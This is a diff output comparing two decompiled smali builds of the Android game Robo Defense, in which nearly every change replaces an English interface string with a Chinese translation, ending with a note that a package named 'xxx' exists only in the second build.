+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 30 \u7684\u5e9f\u589f"
+1197c1197
+<     const-string v1, "The Ruins level 50"
+---
+>     const-string v1, "50\u7ea7 \u5e9f\u589f"
+1210c1210
+<     const-string v1, "Finish the the Ruins at difficulty level 50"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 50 \u7684\u5e9f\u589f"
+1218c1218
+<     const-string v1, "Factory 10"
+---
+>     const-string v1, "\u5de5\u5382 10"
+1231c1231
+<     const-string v1, "Finish the the Factory 10 times"
+---
+>     const-string v1, "\u5b8c\u6210\u5de5\u5382 10 \u6b21"
+1239c1239
+<     const-string v1, "Factory 25"
+---
+>     const-string v1, "\u5de5\u5382 25"
+1252c1252
+<     const-string v1, "Finish the the Factory 25 times"
+---
+>     const-string v1, "\u5b8c\u6210\u5de5\u5382 25 \u6b21"
+1260c1260
+<     const-string v1, "The Factory level 20"
+---
+>     const-string v1, "\u5de5\u5382\u7ea7\u522b20"
+1273c1273
+<     const-string v1, "Finish the the Factory at difficulty level 20"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 20 \u7684\u5de5\u5382"
+1281c1281
+<     const-string v1, "The Factory level 40"
+---
+>     const-string v1, "\u5de5\u5382\u7ea7\u522b 40"
+1294c1294
+<     const-string v1, "Finish the the Factory at difficulty level 40"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 40 \u7684\u5de5\u5382"
+1315c1315
+<     const-string v1, "Finish a game at level >= 30 and health >= 30"
+---
+>     const-string v1, "30 \u5b8c\u6210\u7ea7\u522b>= 30 \u4e14\u5065\u5eb7>= 30 \u7684\u6e38\u620f"
+1323c1323
+<     const-string v1, "Courtyard 10"
+---
+>     const-string v1, "\u5ead\u9662 10"
+1336c1336
+<     const-string v1, "Finish the the Courtyard 10 times"
+---
+>     const-string v1, "\u5b8c\u6210\u5ead\u9662 10 \u6b21"
+1344c1344
+<     const-string v1, "Courtyard 25"
+---
+>     const-string v1, "\u5ead\u9662 25"
+1357c1357
+<     const-string v1, "Finish the the Courtyard 25 times"
+---
+>     const-string v1, "\u5b8c\u6210\u5ead\u9662 25 \u6b21"
+1365c1365
+<     const-string v1, "The Courtyard level 15"
+---
+>     const-string v1, "\u5ead\u9662\u7ea7\u522b 15"
+1378c1378
+<     const-string v1, "Finish the the Courtyard at difficulty level 15"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 15 \u7684\u5ead\u9662"
+1386c1386
+<     const-string v1, "The Courtyard level 25"
+---
+>     const-string v1, "\u5ead\u9662\u7ea7\u522b25"
+1399c1399
+<     const-string v1, "Finish the the Courtyard at difficulty level 25"
+---
+>     const-string v1, "\u5b8c\u6210\u96be\u5ea6\u7ea7\u522b\u4e3a 25 \u7684\u5ead\u9662"
+1420c1420
+<     const-string v1, "Finish 5 A-Coded VR Training missions"
+---
+>     const-string v1, "\u5b8c\u6210 5 D-Coded VR \u53d7\u8bad\u4efb\u52a1"
+1441c1441
+<     const-string v1, "Finish 5 B-Coded VR Training missions"
+---
+>     const-string v1, "\u5b8c\u6210 5 D-Coded VR \u53d7\u8bad\u4efb\u52a1"
+1462c1462
+<     const-string v1, "Finish 5 C-Coded VR Training missions"
+---
+>     const-string v1, "\u5b8c\u6210 5 D-Coded VR \u53d7\u8bad\u4efb\u52a1"
+1483c1483
+<     const-string v1, "Finish 5 D-Coded VR Training missions"
+---
+>     const-string v1, "\u5b8c\u6210 5 D-Coded VR \u53d7\u8bad\u4efb\u52a1"
+1491c1491
+<     const-string v1, "Titan Defeated"
+---
+>     const-string v1, "\u6253\u8d25\u6cf0\u5766"
+1504c1504
+<     const-string v1, "Find and Defeat the Titan"
+---
+>     const-string v1, "\u627e\u5230\u5e76\u51fb\u8d25\u6cf0\u5766"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/Display.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/Display.smali
+1186c1186
+<     const-string v0, "Game Over"
+---
+>     const-string v0, "\u6e38\u620f\u7ed3\u675f"
+1188c1188
+<     const-string v1, "(Choose \'New Game\' From Menu To Play Again)"
+---
+>     const-string v1, "(\u4ece \u83dc\u5355 \u9009\u62e9 \'\u65b0\u6e38\u620f\' \u518d\u73a9\u4e00\u6b21)"
+1202c1202
+<     const-string v0, "Congratulations: You WIN!"
+---
+>     const-string v0, "\u606d\u559c: \u60a8\u8d62\u4e86!"
+1204c1204
+<     const-string v1, "(Choose \'New Game\' From Menu To Play Again)"
+---
+>     const-string v1, "(\u4ece \u83dc\u5355 \u9009\u62e9 \'\u65b0\u6e38\u620f\' \u518d\u73a9\u4e00\u6b21)"
+1311c1311
+<     const-string v2, "Welcome To Robo Defense"
+---
+>     const-string v2, "\u6b22\u8fce\u6765\u5230\u673a\u5668\u4eba\u5854\u9632"
+1332c1332
+<     const-string v2, "(Tap Screen To Start Game)"
+---
+>     const-string v2, "(\u70b9\u51fb\u5c4f\u5e55\u5f00\u59cb\u6e38\u620f)"
+1361c1361
+<     const-string v2, "Instructions:"
+---
+>     const-string v2, "\u8bf4\u660e:"
+1375c1375
+<     const-string v2, "- Prevent enemies from crossing the screen"
+---
+>     const-string v2, "- \u963b\u6b62\u654c\u4eba\u9003\u8dd1"
+1389c1389
+<     const-string v2, "- Drag new towers from buttons on the lower right"
+---
+>     const-string v2, "- \u70b9\u51fb\u53f3\u4e0b\u89d2\u6309\u94ae\u62d6\u52a8\u65b0\u5efa\u70ae\u5854"
+1403c1403
+<     const-string v2, "- Tap a tower to upgrade it"
+---
+>     const-string v2, "- \u53ef\u4ee5\u70b9\u51fb\u70ae\u5854\u8fdb\u884c\u5347\u7ea7"
+1417c1417
+<     const-string v2, "- Drag your finger to scroll the play area"
+---
+>     const-string v2, "- \u53ef\u4ee5\u4f7f\u7528\u60a8\u7684\u624b\u6307\u62d6\u52a8\u6e38\u620f\u5730\u56fe"
+1601c1601
+<     const-string v2, "Game Paused"
+---
+>     const-string v2, "\u6e38\u620f\u6682\u505c"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/GameHud.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/GameHud.smali
+293c293
+<     const-string v2, "Level:"
+---
+>     const-string v2, "\u7b49\u7ea7:"
+327c327
+<     const-string v1, "Score:"
+---
+>     const-string v1, "\u5f97\u5206:"
+336c336
+<     const-string v1, "Bonus:"
+---
+>     const-string v1, "\u5956\u91d1:"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/LevelData.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/LevelData.smali
+106c106
+<     const-string v1, "Basic Level"
+---
+>     const-string v1, "\u521d\u7ea7"
+110c110
+<     const-string v1, "The Ruins"
+---
+>     const-string v1, "\u5e9f\u589f"
+114c114
+<     const-string v1, "The Factory"
+---
+>     const-string v1, "\u5de5\u5382"
+118c118
+<     const-string v1, "The Courtyard"
+---
+>     const-string v1, "\u5ead\u9662"
+122c122
+<     const-string v1, "VR Training"
+---
+>     const-string v1, "\u865a\u62df\u73b0\u5b9e\u8bad\u7ec3"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/LevelSelectActivity.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/LevelSelectActivity.smali
+63c63
+<     const-string v2, " Level "
+---
+>     const-string v2, " \u7b49\u7ea7 "
+614c614
+<     const-string v4, "The max level is "
+---
+>     const-string v4, "\u6700\u9ad8\u7b49\u7ea7\u662f "
+626c626
+<     const-string v4, ".  Win level "
+---
+>     const-string v4, "\u3002\u5b8c\u6210\u80dc\u5229\u7b49\u7ea7 "
+638c638
+<     const-string v4, " to increase the max to "
+---
+>     const-string v4, " \u540e\u589e\u52a0\u6700\u9ad8\u7b49\u7ea7\u5230"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/OptionsData.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/OptionsData.smali
+61c61
+<     const-string v1, "Enable Sound"
+---
+>     const-string v1, "\u542f\u7528\u58f0\u97f3"
+75c75
+<     const-string v1, "Deactivate Fast Foward Between Levels"
+---
+>     const-string v1, "\u4e0b\u4e00\u6ce2\u5230\u6765\u65f6\u53d6\u6d88\u52a0\u901f"
+89c89
+<     const-string v1, "Fast Forward Pause After Life Loss"
+---
+>     const-string v1, "\u751f\u547d\u51cf\u5c11\u65f6\u6682\u505c\u52a0\u901f"
+105c105
+<     const-string v1, "Prevent Screen From Locking"
+---
+>     const-string v1, "\u9632\u6b62\u5c4f\u5e55\u9501\u5b9a"
+121c121
+<     const-string v1, "Show Turrent Range While Placing/Upgrading"
+---
+>     const-string v1, "\u653e\u7f6e/\u5347\u7ea7\u65f6\u663e\u793a\u8303\u56f4"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/QuickSave.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/QuickSave.smali
+276c276
+<     const-string v6, "State Save: Could not open file"
+---
+>     const-string v6, "\u72b6\u6001\u4fdd\u5b58: \u65e0\u6cd5\u6253\u5f00\u6587\u4ef6"
+291c291
+<     const-string v6, "State Save: write data failed"
+---
+>     const-string v6, "\u72b6\u6001\u4fdd\u5b58: \u5199\u5165\u6570\u636e\u5931\u8d25"
+400c400
+<     const-string v9, "Quick Load Failed: bad eyecatcher"
+---
+>     const-string v9, "\u5feb\u901f\u52a0\u8f7d\u5931\u8d25: bad eyecatcher"
+433c433
+<     const-string v9, "Quick Load Failed: Game was updated"
+---
+>     const-string v9, "\u5feb\u901f\u52a0\u8f7d\u5931\u8d25: \u6e38\u620f\u5df2\u66f4\u65b0"
+466c466
+<     const-string v9, "Quick Load Success"
+---
+>     const-string v9, "\u5feb\u901f\u52a0\u8f7d\u6210\u529f"
+519c519
+<     const-string v9, "Quick Load Failed: could not open file"
+---
+>     const-string v9, "\u5feb\u901f\u52a0\u8f7d\u5931\u8d25: \u65e0\u6cd5\u6253\u5f00\u6587\u4ef6"
+534c534
+<     const-string v9, "Quick Load Failed: data corrupted (sorry)"
+---
+>     const-string v9, "\u5feb\u901f\u52a0\u8f7d\u5931\u8d25: \u6570\u636e\u635f\u574f"
+549c549
+<     const-string v9, "Quick Load Failed: IO Error reading file"
+---
+>     const-string v9, "\u5feb\u901f\u52a0\u8f7d\u5931\u8d25: \u8bfb\u53d6 IO \u6587\u4ef6\u9519\u8bef"
+561c561
+<     const-string v9, "Quick Load Failed"
+---
+>     const-string v9, "\u5feb\u901f\u52a0\u8f7d\u5931\u8d25"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/RewardActivity$RewardUI.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/RewardActivity$RewardUI.smali
+124c124
+<     const-string v6, "Unlock"
+---
+>     const-string v6, "\u89e3\u9501"
+132c132
+<     const-string v5, "   [Unlocked"
+---
+>     const-string v5, "   [\u6ca1\u6709\u9501"
+201c201
+<     const-string v5, "  [Points: "
+---
+>     const-string v5, "  [\u70b9\u6570: "
+216c216
+<     const-string v5, "   [Lvl: "
+---
+>     const-string v5, "   [\u7b49\u7ea7: "
+234c234
+<     const-string v5, "  Points: "
+---
+>     const-string v5, "  \u70b9\u6570: "
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/RewardActivity.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/RewardActivity.smali
+200c200
+<     const-string v4, "Upgrade"
+---
+>     const-string v4, "\u5347\u7ea7"
+255c255
+<     const-string v3, "You Have "
+---
+>     const-string v3, "\u60a8\u6709"
+265c265
+<     const-string v3, " Reward Points"
+---
+>     const-string v3, " \u5956\u52b1\u70b9\u6570"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/RewardData.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/RewardData.smali
+288c288
+<     const-string v1, "Stronger Bullets"
+---
+>     const-string v1, "\u52a0\u5f3a\u5f39\u836f"
+303c303
+<     const-string v1, "Increase bullet power by"
+---
+>     const-string v1, "\u589e\u52a0\u5f39\u836f\u5a01\u529b"
+311c311
+<     const-string v1, "Stronger Explosives"
+---
+>     const-string v1, "\u52a0\u5f3a\u7206\u70b8\u5a01\u529b"
+324c324
+<     const-string v1, "Increase rocket/missile/mortar explosive power by"
+---
+>     const-string v1, "\u589e\u52a0\u706b\u7bad/\u5bfc\u5f39/\u8feb\u51fb\u70ae\u5f39\u7206\u70b8\u5a01\u529b"
+343c343
+<     const-string v1, "Faster Rocket Reload"
+---
+>     const-string v1, "\u63d0\u5347\u706b\u7bad\u586b\u5f39\u901f\u5ea6"
+356c356
+<     const-string v1, "Reload rockets"
+---
+>     const-string v1, "\u63d0\u5347\u706b\u7bad\u88c5\u586b"
+364c364
+<     const-string v1, "% faster"
+---
+>     const-string v1, "% \u901f\u5ea6"
+375c375
+<     const-string v1, "Faster Antiair Reload"
+---
+>     const-string v1, "\u63d0\u5347\u9632\u7a7a\u88c5\u586b\u901f\u5ea6"
+388c388
+<     const-string v1, "Reload Antiair missiles"
+---
+>     const-string v1, "\u63d0\u5347\u9632\u7a7a\u5bfc\u5f39\u88c5\u586b"
+396c396
+<     const-string v1, "% faster"
+---
+>     const-string v1, "% \u901f\u5ea6"
+407c407
+<     const-string v1, "Faster Artillery Reload"
+---
+>     const-string v1, "\u63d0\u5347\u706b\u70ae\u88c5\u586b\u901f\u5ea6"
+420c420
+<     const-string v1, "Reload mortar/artillery shells"
+---
+>     const-string v1, "\u63d0\u5347\u88c5\u586b \u8feb\u51fb\u70ae/\u70ae\u5f39"
+428c428
+<     const-string v1, "% faster"
+---
+>     const-string v1, "% \u901f\u5ea6"
+439c439
+<     const-string v1, "Longer Flame Burn"
+---
+>     const-string v1, "\u706b\u7130\u4f24\u5bb3\u4f24\u65f6\u95f4"
+454c454
+<     const-string v1, "Increase flame burn duration by"
+---
+>     const-string v1, "\u589e\u52a0\u706b\u7130\u7684\u5bb3\u4f24\u65f6\u95f4"
+473c473
+<     const-string v1, "Longer Slowdown"
+---
+>     const-string v1, "\u51cf\u901f\u65f6\u95f4"
+488c488
+<     const-string v1, "Increase slow tower effect duration by"
+---
+>     const-string v1, "\u589e\u52a0\u70ae\u5854\u51cf\u901f\u5f71\u54cd\u7684\u6301\u7eed\u65f6\u95f4"
+507c507
+<     const-string v1, "Health Reward"
+---
+>     const-string v1, "\u589e\u52a0\u751f\u547d\u503c"
+522c522
+<     const-string v1, "Increase base health by"
+---
+>     const-string v1, "\u589e\u52a0\u57fa\u7840\u751f\u547d\u503c"
+530c530
+<     const-string v1, "Starting Cash Reward"
+---
+>     const-string v1, "\u589e\u52a0\u73b0\u91d1\u5956\u52b1"
+545c545
+<     const-string v1, "Increase starting cash by"
+---
+>     const-string v1, "\u589e\u52a0\u5f00\u59cb\u73b0\u91d1"
+558c558
+<     const-string v1, "Unlock Teleport Tower"
+---
+>     const-string v1, "\u89e3\u9501\u8fdc\u8ddd\u79bb\u4f20\u9001\u70ae\u5854"
+573c573
+<     const-string v1, "Teleport Tower teleports enemies back to the start"
+---
+>     const-string v1, "\u628a\u5373\u5c06\u901a\u8fc7\u7684\u654c\u4eba\u4f20\u9001\u56de\u8d77\u70b9"
+587c587
+<     const-string v1, "Unlock Mine Tower"
+---
+>     const-string v1, "\u89e3\u9501\u5730\u96f7\u70ae\u5854"
+600c600
+<     const-string v1, "Mines deal a large amount of damage when stepped on"
+---
+>     const-string v1, "\u589e\u52a0\u8e29\u5230\u5730\u96f7\u65f6\u7684\u4f24\u5bb3"
+733c733
+<     const-string v5, "power lvl "
+---
+>     const-string v5, "\u653b\u51fb\u7b49\u7ea7 "
+762c762
+<     const-string v2, "power lvl "
+---
+>     const-string v2, "\u653b\u51fb\u7b49\u7ea7 "
+809c809
+<     const-string v2, "speed lvl "
+---
+>     const-string v2, "\u901f\u5ea6\u7b49\u7ea7 "
+857c857
+<     const-string v2, "effect lvl "
+---
+>     const-string v2, "\u6548\u679c\u7b49\u7ea7 "
+905c905
+<     const-string v2, "power lvl "
+---
+>     const-string v2, "\u653b\u51fb\u7b49\u7ea7 "
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/ScoreOverlay.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/ScoreOverlay.smali
+275c275
+<     const-string v2, "Score:"
+---
+>     const-string v2, "\u5f97\u5206:"
+292c292
+<     const-string v2, "Victory Bonus:"
+---
+>     const-string v2, "\u80dc\u5229\u5956\u91d1:"
+328c328
+<     const-string v2, "Remaining Money Bonus:"
+---
+>     const-string v2, "\u5269\u4f59\u5956\u91d1:"
+346c346
+<     const-string v2, "Perfect Game Bonus:"
+---
+>     const-string v2, "\u5b8c\u6210\u6e38\u620f\u5956\u91d1:"
+400c400
+<     const-string v0, "Earned Reward Points"
+---
+>     const-string v0, "\u83b7\u5f97\u5956\u52b1\u70b9\u6570"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/TitleActivity.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/TitleActivity.smali
+920c920
+<     const-string v3, "Reward Points Earned: "
+---
+>     const-string v3, "\u5956\u52b1\u70b9\u6570: "
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/TowerData.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/TowerData.smali
+311c311
+<     const-string v1, "Sell For Cash"
+---
+>     const-string v1, "\u51fa\u552e"
+444c444
+<     const-string v1, "Medium Gun"
+---
+>     const-string v1, "\u4e2d\u7ea7\u70ae"
+511c511
+<     const-string v1, "Heavy Gun"
+---
+>     const-string v1, "\u91cd\u70ae"
+596c596
+<     const-string v1, "Antiair Cannon"
+---
+>     const-string v1, "\u5bf9\u7a7a\u70ae"
+678c678
+<     const-string v1, "Heavy Antiair Cannon"
+---
+>     const-string v1, "\u91cd\u578b\u5bf9\u7a7a\u70ae"
+764c764
+<     const-string v1, "Flame Tower"
+---
+>     const-string v1, "\u706b\u7130\u70ae\u5854"
+847c847
+<     const-string v1, "Inferno Tower"
+---
+>     const-string v1, "\u706b\u6d77\u70ae\u5854"
+970c970
+<     const-string v1, "Basic Slow Tower"
+---
+>     const-string v1, "\u521d\u7ea7\u51cf\u901f\u70ae\u5854"
+1060c1060
+<     const-string v1, "Upgraded Slow Tower"
+---
+>     const-string v1, "\u5347\u7ea7\u51cf\u901f\u70ae\u5854"
+1143c1143
+<     const-string v1, "Advanced Slow Tower"
+---
+>     const-string v1, "\u9ad8\u7ea7\u51cf\u901f\u70ae\u5854"
+1242c1242
+<     const-string v1, "Light Rocket Launcher"
+---
+>     const-string v1, "\u8f7b\u578b\u706b\u7bad\u70ae\u5854"
+1343c1343
+<     const-string v1, "Medium Rocket Launcher"
+---
+>     const-string v1, "\u4e2d\u578b\u706b\u7bad\u70ae\u5854"
+1437c1437
+<     const-string v1, "Heavy Rocket Launcher"
+---
+>     const-string v1, "\u91cd\u578b\u706b\u7bad\u70ae\u5854"
+1538c1538
+<     const-string v1, "Surface to Air Missile"
+---
+>     const-string v1, "\u5730\u5bf9\u7a7a\u5bfc\u5f39\u70ae\u5854"
+1632c1632
+<     const-string v1, "Adv Surface to Air Missile"
+---
+>     const-string v1, "\u9ad8\u7ea7\u5730\u5bf9\u7a7a\u5bfc\u5f39\u70ae\u5854"
+1738c1738
+<     const-string v1, "Mortar"
+---
+>     const-string v1, "\u8feb\u51fb\u70ae\u70ae\u5854"
+1839c1839
+<     const-string v1, "Artillery"
+---
+>     const-string v1, "\u706b\u70ae\u70ae\u53f0"
+1926c1926
+<     const-string v1, "Unarmed Teleport Tower"
+---
+>     const-string v1, "\u65e0\u653b\u51fb\u529b\u4f20\u9001\u70ae\u5854"
+2007c2007
+<     const-string v1, "Armed Teleport Tower"
+---
+>     const-string v1, "\u6b66\u88c5\u7684\u4f20\u9001\u70ae\u5854"
+2074c2074
+<     const-string v1, "Unarmed Mine"
+---
+>     const-string v1, "\u65e0\u653b\u51fb\u529b\u7684\u5730\u96f7"
+2154c2154
+<     const-string v1, "Armed Mine"
+---
+>     const-string v1, "\u5f85\u53d1\u96f7"
+diff -r result/APP_35/App_B_35/smali/com/magicwach/rdefense/UpgradeButton.smali result/APP_35/App_M_35/smali/com/magicwach/rdefense/UpgradeButton.smali
+725c725
+<     const-string v1, "Sell for $"
+---
+>     const-string v1, "\u51fa\u552e $"
+Somente em result/APP_35/App_M_35/smali/com: xxx
